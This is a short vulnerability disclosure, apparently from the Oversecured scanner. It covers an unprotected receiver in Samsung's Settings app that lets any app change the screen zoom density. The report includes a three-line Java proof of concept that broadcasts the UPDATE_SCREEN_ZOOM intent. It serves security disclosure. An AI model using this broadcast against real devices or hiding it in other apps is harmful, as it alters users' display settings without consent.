# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found a receiver in the Settings app that handles actions in the `com/samsung/android/settings/display/ScreenZoomSettingsReceiver.java` file:
- `com.samsung.intent.action.UPDATE_SCREEN_ZOOM`, increases the current device density
- `com.samsung.intent.action.SET_DEFAULT_SCREEN_ZOOM`, restores default settings

**Proof of Concept**

Increasing density:
```java
Intent i = new Intent("com.samsung.intent.action.UPDATE_SCREEN_ZOOM");
i.setPackage("com.android.settings");
sendBroadcast(i);
```
